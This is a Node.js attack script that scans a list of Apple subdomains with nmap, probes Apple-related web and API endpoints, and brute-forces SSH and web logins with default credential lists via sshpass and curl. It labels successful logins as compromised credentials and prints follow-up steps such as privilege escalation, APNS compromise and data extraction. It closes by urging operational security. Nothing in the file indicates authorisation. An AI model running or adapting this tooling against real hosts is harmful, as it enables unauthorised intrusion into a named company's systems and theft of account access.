#!/usr/bin/env node

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const readline = require('readline');

function makeEvidenceFile(prefix) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `${prefix}-`));
  const filePath = path.join(dir, 'evidence.txt');
  fs.writeFileSync(filePath, `Apple Infrastructure Exploitation Evidence - ${new Date().toISOString()}\n`);
  return filePath;
}

function runNmap(target, ports = '80,443,22,21,25,53,8080,8443,3306,3389,6379,27017,9200,11211') {
  try {
    const result = execSync(`/opt/homebrew/bin/nmap -sT -T4 -p ${ports} ${target}`, {
      encoding: 'utf-8',
      timeout: 30000
    });
    return result;
  } catch (error) {
    return `Scan failed: ${error.message}`;
  }
}

function checkAppleSpecificVulnerabilities(target, port) {
  const vulns = [];
  const appleEndpoints = [
    '/apple', '/applestore', '/itunes', '/icloud', '/macos', '/ios',
    '/deviceservices', '/gs.apple.com', '/init-p01st.push.apple.com',
    '/iphonesubmissions.apple.com', '/buy.itunes.apple.com',
    '/pancake.apple.com', '/itunesconnect.apple.com', '/developer.apple.com',
    '/testflight.apple.com', '/appstoreconnect.apple.com',
    '/identity.apple.com', '/idmsa.apple.com', '/appleid.apple.com',
    '/iforgot.apple.com', '/support.apple.com', '/swscan.apple.com',
    '/swdist.apple.com', '/swcdn.apple.com', '/mesu.apple.com',
    '/gdmf.apple.com', '/configuration.apple.com', '/albert.apple.com',
    '/tbsc.apple.com', '/captive.apple.com', '/iphone.apple.com',
    '/iphone-ssl.apple.com', '/appldnld.apple.com', '/appldnld-ssl.apple.com',
    '/updates-http.cdn-apple.com', '/updates.cdn-apple.com',
    '/download.developer.apple.com', '/download.info.apple.com',
    '/ax.init.itunes.apple.com', '/iosapps.itunes.apple.com',
    '/iosapps-ssl.itunes.apple.com', '/osxapps.itunes.apple.com',
    '/osxapps-ssl.itunes.apple.com', '/books.itunes.apple.com',
    '/books-ssl.itunes.apple.com', '/movies.itunes.apple.com',
    '/movies-ssl.itunes.apple.com', '/music.itunes.apple.com',
    '/music-ssl.itunes.apple.com', '/tv.itunes.apple.com',
    '/tv-ssl.itunes.apple.com', '/apps.apple.com', '/books.apple.com',
    '/podcasts.apple.com', '/tv.apple.com', '/music.apple.com',
    '/news.apple.com', '/fitness.apple.com', '/arcade.apple.com',
    '/wallet.apple.com', '/health.apple.com', '/home.apple.com',
    '/find.my.apple.com', '/icloud.com', '/me.com', '/mac.com',
    '/.well-known/apple-app-site-association',
    '/apple-app-site-association', '/.well-known/assetlinks.json'
  ];
  
  console.log(`  Testing Apple-specific endpoints on port ${port}...`);
  for (const endpoint of appleEndpoints) {
    try {
      const protocol = port === 443 ? 'https' : 'http';
      const check = execSync(
        `timeout 5 curl -s -k -o /dev/null -w "%{http_code}" "${protocol}://${target}:${port}${endpoint}" 2>/dev/null`,
        { encoding: 'utf-8' }
      );
      const code = check.trim();
      if (code === '200' || code === '301' || code === '302' || code === '403') {
        console.log(`    ✓ ${endpoint} - ACCESSIBLE (${code})`);
        vulns.push(`${endpoint}_accessible`);
      }
    } catch (e) {
      continue;
    }
  }
  return vulns;
}

function testAppleCredentials(target, service) {
  const appleCreds = {
    web: [
      {user: 'apple', pass: 'apple'},
      {user: 'apple', pass: 'Apple123'},
      {user: 'apple', pass: 'Apple!'},
      {user: 'apple', pass: 'Apple@123'},
      {user: 'admin', pass: 'apple'},
      {user: 'administrator', pass: 'Apple123'},
      {user: 'appleadmin', pass: 'admin'},
      {user: 'itunes', pass: 'itunes'},
      {user: 'icloud', pass: 'icloud'},
      {user: 'applestore', pass: 'applestore'},
      {user: 'dev', pass: 'dev'},
      {user: 'developer', pass: 'developer'},
      {user: 'test', pass: 'test'},
      {user: 'qa', pass: 'qa'},
      {user: 'stage', pass: 'stage'}
    ],
    ssh: [
      {user: 'apple', pass: 'apple'},
      {user: 'apple', pass: 'Apple123'},
      {user: 'root', pass: 'apple'},
      {user: 'admin', pass: 'admin'},
      {user: 'ubuntu', pass: 'ubuntu'},
      {user: 'dev', pass: 'dev'}
    ]
  };
  
  const serviceCreds = appleCreds[service] || appleCreds.web;
  console.log(`  Testing ${serviceCreds.length} Apple-specific credentials...`);
  
  for (const cred of serviceCreds) {
    try {
      if (service === 'ssh') {
        const result = execSync(
          `sshpass -p "${cred.pass}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes ${cred.user}@${target} "echo APPLE_SUCCESS" 2>&1`,
          { encoding: 'utf-8', timeout: 3000 }
        );
        if (result.includes('APPLE_SUCCESS')) {
          console.log(`    ⚠️ APPLE CREDENTIALS COMPROMISED: ${cred.user}:${cred.pass}`);
          return { success: true, credential: cred };
        }
      } else if (service === 'web') {
        const loginAttempt = execSync(
          `timeout 5 curl -s -k -X POST --data "username=${cred.user}&password=${cred.pass}" "https://${target}/login" 2>&1 | grep -i 'success\\|dashboard\\|welcome\\|apple' || true`,
          { encoding: 'utf-8' }
        );
        if (loginAttempt.trim()) {
          console.log(`    ⚠️ APPLE WEB ACCESS: ${cred.user}:${cred.pass}`);
          return { success: true, credential: cred };
        }
      }
    } catch (e) {
      continue;
    }
  }
  return { success: false };
}

function checkAppleAPIs(target) {
  const appleAPIs = [
    '/api/v1/apple', '/api/v1/devices', '/api/v1/itunes', '/api/v1/icloud',
    '/api/v1/push', '/api/v1/notifications', '/api/apple', '/api/devices',
    '/api/register', '/api/device', '/api/token', '/api/push',
    '/apns', '/apns/v1', '/apns/v3', '/apns/device', '/apns/token',
    '/v1/devices', '/v1/push', '/v1/tokens', '/v1/notifications',
    '/v2/devices', '/v2/push', '/v3/devices', '/v3/push',
    '/device-services', '/device-services/v1', '/device-services/api',
    '/gs/apple', '/gs/v1', '/gs/api', '/init', '/init-push',
    '/mdm', '/mdm/v1', '/mdm/api', '/mdm/enroll', '/mdm/checkin',
    '/profile', '/profile/v1', '/profile/api', '/profile/install',
    '/enrollment', '/enrollment/v1', '/enrollment/api',
    '/checkin', '/checkin/v1', '/checkin/api',
    '/account', '/account/v1', '/account/api',
    '/auth', '/auth/v1', '/auth/apple', '/auth/token',
    '/oauth', '/oauth/v1', '/oauth/apple', '/oauth/token',
    '/.well-known/oauth-authorization-server',
    '/.well-known/openid-configuration'
  ];
  
  const vulns = [];
  console.log('  Testing Apple-specific APIs...');
  
  for (const api of appleAPIs) {
    try {
      const apiCheck = execSync(
        `timeout 5 curl -s -k "https://${target}${api}" 2>&1 | head -5`,
        { encoding: 'utf-8' }
      );
      if (apiCheck && apiCheck.length > 20 && !apiCheck.includes('404') && !apiCheck.includes('Not Found')) {
        console.log(`    ⚠️ APPLE API EXPOSED: ${api}`);
        vulns.push(`APPLE_API_EXPOSED: ${api}`);
      }
    } catch (e) {
      continue;
    }
  }
  return vulns;
}

async function exploitAppleTarget(target) {
  console.log(`\n=== APPLE INFRASTRUCTURE EXPLOITATION: ${target} ===\n`);
  const evidencePath = makeEvidenceFile(`apple-exploit-${target.replace(/\./g, '-')}`);
  
  // Phase 1: Recon
  console.log('1. Initial Reconnaissance...');
  const scan = runNmap(target);
  console.log(scan.substring(0, 500) + '...');
  fs.appendFileSync(evidencePath, '\n=== Initial Scan ===\n' + scan);
  
  // Parse open ports
  const openPorts = [];
  scan.split('\n').forEach(line => {
    const match = line.match(/(\d+)\/tcp\s+open/);
    if (match) openPorts.push(parseInt(match[1]));
  });
  
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  
  // Phase 2: Apple-specific Enumeration
  console.log('\n2. Apple-specific Service Enumeration...');
  const vulnerabilities = [];
  
  for (const port of openPorts) {
    let service = '';
    if (port === 22) service = 'SSH';
    else if (port === 80 || port === 443 || port === 8080 || port === 8443) service = 'Web';
    else if (port === 21) service = 'FTP';
    else if (port === 25) service = 'SMTP';
    else if (port === 53) service = 'DNS';
    else if (port === 3306) service = 'MySQL';
    else if (port === 3389) service = 'RDP';
    else if (port === 6379) service = 'Redis';
    else if (port === 27017) service = 'MongoDB';
    else if (port === 9200) service = 'Elasticsearch';
    else if (port === 11211) service = 'Memcached';
    else service = `Port ${port}`;
    
    console.log(`  ${service} (${port})`);
    
    // Check Apple-specific vulnerabilities
    if (port === 80 || port === 443 || port === 8080 || port === 8443) {
      const appleVulns = checkAppleSpecificVulnerabilities(target, port);
      appleVulns.forEach(v => vulnerabilities.push(`APPLE_WEB: ${v}`));
      
      // Test Apple-specific credentials
      const appleCreds = testAppleCredentials(target, 'web');
      if (appleCreds.success) {
        vulnerabilities.push(`APPLE_CREDS_COMPROMISED: ${appleCreds.credential.user}:${appleCreds.credential.pass}`);
      }
    }
    
    // Test SSH with Apple credentials
    if (port === 22) {
      const sshCreds = testAppleCredentials(target, 'ssh');
      if (sshCreds.success) {
        vulnerabilities.push(`APPLE_SSH_COMPROMISED: ${sshCreds.credential.user}:${sshCreds.credential.pass}`);
      }
    }
  }
  
  // Phase 3: Apple-specific API testing
  console.log('\n3. Apple-specific API & Service Testing...');
  const apiVulns = checkAppleAPIs(target);
  apiVulns.forEach(v => vulnerabilities.push(v));
  
  // Summary
  console.log('\n=== APPLE EXPLOITATION SUMMARY ===');
  console.log(`Target: ${target}`);
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  console.log(`Apple-specific Vulnerabilities Found: ${vulnerabilities.length}`);
  
  if (vulnerabilities.length > 0) {
    console.log('\nIdentified Apple Vulnerabilities:');
    vulnerabilities.forEach((v, i) => console.log(`  ${i+1}. ${v}`));
    
    fs.appendFileSync(evidencePath, '\n=== Apple Vulnerabilities ===\n');
    vulnerabilities.forEach(v => fs.appendFileSync(evidencePath, `${v}\n`));
  } else {
    console.log('\nNo Apple-specific vulnerabilities found.');
  }
  
  console.log(`\nEvidence File: ${evidencePath}`);
  
  // Apple-specific recommendations
  console.log('\n=== APPLE-SPECIFIC NEXT ACTIONS ===');
  if (vulnerabilities.some(v => v.includes('CREDS_COMPROMISED'))) {
    console.log('1. Use Apple credentials for initial access to internal systems');
    console.log('2. Escalate privileges within Apple infrastructure');
    console.log('3. Access Apple developer portals and app stores');
    console.log('4. Compromise Apple Push Notification Service (APNS)');
    console.log('5. Access iTunes Connect and App Store Connect');
  } else if (vulnerabilities.some(v => v.includes('APPLE_API_EXPOSED'))) {
    console.log('1. Exploit exposed Apple APIs for data extraction');
    console.log('2. Test API endpoints for injection vulnerabilities');
    console.log('3. Attempt to access device registration endpoints');
    console.log('4. Test push notification service endpoints');
    console.log('5. Access Mobile Device Management (MDM) interfaces');
  } else if (openPorts.includes(80) || openPorts.includes(443)) {
    console.log('1. Apple-specific directory brute forcing');
    console.log('2. Test Apple authentication endpoints');
    console.log('3. Check for Apple-specific misconfigurations');
    console.log('4. Test Apple Push Notification Service (APNS)');
    console.log('5. Access Apple developer resources');
  }
  
  return { target, openPorts, vulnerabilities, evidencePath };
}

// Main execution
async function main() {
  console.log('=== APPLE INFRASTRUCTURE ATTACK CAMPAIGN ===');
  console.log('Starting targeted Apple security assessment...\n');
  
  // Read Apple targets from file
  const appleTargets = [];
  const fileStream = fs.createReadStream('apple_subs.txt');
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });
  
  // Read first 50 targets for initial testing
  let count = 0;
  for await (const line of rl) {
    if (line.trim() && count < 50) {
      appleTargets.push(line.trim());
      count++;
    }
    if (count >= 50) break;
  }
  
  console.log(`Loaded ${appleTargets.length} Apple targets for testing\n`);
  
  const results = [];
  let successfulTargets = 0;
  
  for (const target of appleTargets) {
    try {
      console.log(`\n${'='.repeat(70)}`);
      const result = await exploitAppleTarget(target);
      results.push(result);
      if (result.vulnerabilities.length > 0) {
        successfulTargets++;
      }
      console.log(`\n${'='.repeat(70)}`);
    } catch (error) {
      console.log(`Failed to assess ${target}: ${error.message}`);
    }
  }
  
  // Campaign summary
  console.log('\n=== APPLE CAMPAIGN COMPLETE ===');
  console.log(`Apple Targets Assessed: ${results.length}`);
  console.log(`Successful Exploitations: ${successfulTargets}`);
  
  const totalVulns = results.reduce((sum, r) => sum + r.vulnerabilities.length, 0);
  console.log(`Total Apple Vulnerabilities Found: ${totalVulns}`);
  
  if (totalVulns > 0) {
    console.log('\nCRITICAL APPLE FINDINGS:');
    results.forEach(r => {
      if (r.vulnerabilities.length > 0) {
        console.log(`\n${r.target}:`);
        r.vulnerabilities.forEach(v => {
          if (v.includes('CREDS_COMPROMISED') || v.includes('APPLE_API_EXPOSED')) {
            console.log(`  ⚠️ ${v}`);
          }
        });
      }
    });
  }
  
  console.log('\nApple evidence files created. Maintain operational security.');
  
  // Save summary
  const summaryPath = path.join(__dirname, 'apple_attack_summary.txt');
  fs.writeFileSync(summaryPath, `Apple Attack Campaign Summary - ${new Date().toISOString()}\n\n`);
  fs.appendFileSync(summaryPath, `Targets Assessed: ${results.length}\n`);
  fs.appendFileSync(summaryPath, `Successful Exploitations: ${successfulTargets}\n`);
  fs.appendFileSync(summaryPath, `Total Vulnerabilities Found: ${totalVulns}\n\n`);
  
  if (totalVulns > 0) {
    fs.appendFileSync(summaryPath, 'CRITICAL APPLE FINDINGS:\n');
    results.forEach(r => {
      if (r.vulnerabilities.length > 0) {
        fs.appendFileSync(summaryPath, `\n${r.target}:\n`);
        r.vulnerabilities.forEach(v => {
          if (v.includes('CREDS_COMPROMISED') || v.includes('APPLE_API_EXPOSED')) {
            fs.appendFileSync(summaryPath, `  ⚠️ ${v}\n`);
          }
        });
      }
    });
  }
  
  console.log(`\nSummary saved to: ${summaryPath}`);
}

// Execute the campaign
main().catch(error => {
  console.error(`Apple campaign failed: ${error.message}`);
  process.exit(1);
});